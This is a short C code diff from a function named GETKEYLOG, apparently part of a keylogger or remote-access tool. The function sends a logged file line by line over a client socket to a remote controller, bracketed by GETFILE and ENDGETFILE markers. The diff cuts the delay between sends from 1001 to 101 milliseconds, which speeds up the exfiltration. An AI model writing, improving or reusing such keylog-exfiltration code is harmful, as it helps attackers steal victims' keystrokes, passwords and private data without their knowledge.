@@ -83,12 +83,12 @@ void GETKEYLOG(void * paramT){
 	strcpy(buffer, "GETFILE");
 	send((param)->clientSocket, buffer, strlen(buffer), 0);
 	memset(buffer, 0, strlen(buffer));
-	Sleep(1001);
+	Sleep(101);
 
 	while (fgets(buffer, sizeof(buffer), source_file) != NULL) {
 		send((param)->clientSocket, buffer, strlen(buffer), 0);
 		memset(buffer, 0, strlen(buffer));
-		Sleep(1001);
+		Sleep(101);
 
 		/*
 		if (fputs(buffer, destination_file) == EOF) {
@@ -101,7 +101,7 @@ void GETKEYLOG(void * paramT){
 	strcpy(buffer, "ENDGETFILE");
 	send((param)->clientSocket, buffer, strlen(buffer), 0);
 	memset(buffer, 0, strlen(buffer));
-	Sleep(1001);
+	Sleep(101);
 
 
 }
